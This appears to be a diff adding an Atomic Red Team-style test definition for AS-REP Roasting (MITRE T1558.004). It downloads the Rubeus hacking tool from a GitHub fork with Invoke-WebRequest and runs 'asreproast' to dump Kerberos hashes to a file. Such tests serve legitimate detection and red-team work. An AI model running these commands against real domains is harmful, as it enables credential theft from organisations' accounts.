@@ -1,0 +1,58 @@
+{
+    "name": "Rubeus asreproast",
+    "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n",
+        "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
+        "name": "powershell",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1558.004",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "AS-REP Roasting",
+    "source": "ART",
+    "uuid": "615bd568-2859-41b5-9aed-61f6a88e48dd",
+    "arguments": {
+        "local_folder": {
+            "description": "Local path of Rubeus executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads"
+        },
+        "local_executable": {
+            "description": "name of the rubeus executable",
+            "type": "string",
+            "default": "rubeus.exe"
+        },
+        "out_file": {
+            "description": "file where command results are stored",
+            "type": "string",
+            "default": "rubeus_output.txt"
+        },
+        "rubeus_url": {
+            "description": "URL of Rubeus executable",
+            "type": "url",
+            "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Computer must be domain joined\n",
+            "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+        },
+        {
+            "description": "Rubeus must exist\n",
+            "prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\\#{local_executable}\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
